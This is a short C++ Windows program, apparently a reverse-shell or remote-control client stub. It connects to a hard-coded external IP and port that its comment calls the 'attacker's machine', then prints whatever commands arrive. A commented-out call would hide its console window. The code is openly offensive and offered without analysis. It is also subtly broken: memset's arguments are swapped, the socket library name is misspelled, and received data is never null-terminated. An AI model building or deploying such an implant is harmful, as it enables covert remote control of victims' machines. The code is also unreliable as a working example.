#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")
#include <windows.h>
#include <iostream>

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[])
{
  //FreeConsole();
  // listener ip, port on attacker's machine
  char *ip = "172.104.7.26";
  short port = 3333;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
  char *buffer = new char[300];
  memset(buffer, 300, 0);
  while (1)
  {
    if (recv(wSock, buffer, 300, 0) <= 0)
      break;
    else
    {
      for (int i = 0; i < strlen(buffer); i++)
      {
        if (buffer[i] == '\r' || buffer[i] == '\n')
          buffer[i] = 0;
      }
      std::string temp(buffer);
      std::cout << buffer << "\n";
      memset(buffer, 300, 0);
    }
  }
  exit(0);
}